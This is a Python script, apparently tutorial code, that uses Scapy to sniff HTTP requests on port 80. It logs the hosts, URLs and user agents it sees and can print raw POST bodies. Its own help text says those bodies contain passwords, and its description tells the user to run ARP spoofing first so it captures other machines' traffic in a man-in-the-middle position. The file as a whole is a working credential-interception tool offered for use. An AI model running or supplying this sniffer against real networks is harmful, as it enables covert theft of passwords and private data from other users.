from scapy.all import *
from scapy.layers.http import HTTPRequest # import HTTP packet
from colorama import init, Fore
import datetime

# initialize colorama
init()

# define colors
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET

def sniff_packets(iface=None):
    """
    Sniff 80 port packets with `iface`, if None (default), then the
    Scapy's default interface is used
    """
    if iface:
        # port 80 for http (generally)
        # `process_packet` is the callback
        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
    else:
        # sniff with default interface
        sniff(filter="port 80", prn=process_packet, store=False)

def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    # if this packet is an HTTP Request
    if packet.haslayer(HTTPRequest):
        # get the requester's IP Address
        ip = packet[IP].src
        # get the datetime
        time = datetime.datetime.now()
        # get the requester's destination IP Address
        dest = packet[IP].dst
        # get the port number
        port = packet[TCP].sport
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        # get the requested URL
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # get the http version
        version = packet[HTTPRequest].Http_Version
        # get the http response code
        #response = packet[HTTPResponse].Status_Code        
        # get the user agent
        agent = packet[HTTPRequest].User_Agent
        print(f"\n{GREEN}[+] {ip}, {time} Requested {dest}:{port}, {method} {url} with {version}. User Agent: {agent}{RESET}")
        if show_raw and packet.haslayer(Raw) and method == "POST":
            # if show_raw flag is enabled, has raw data, and the requested method is "POST"
            # then show raw
            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
    # parse arguments
    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw
    sniff_packets(iface)


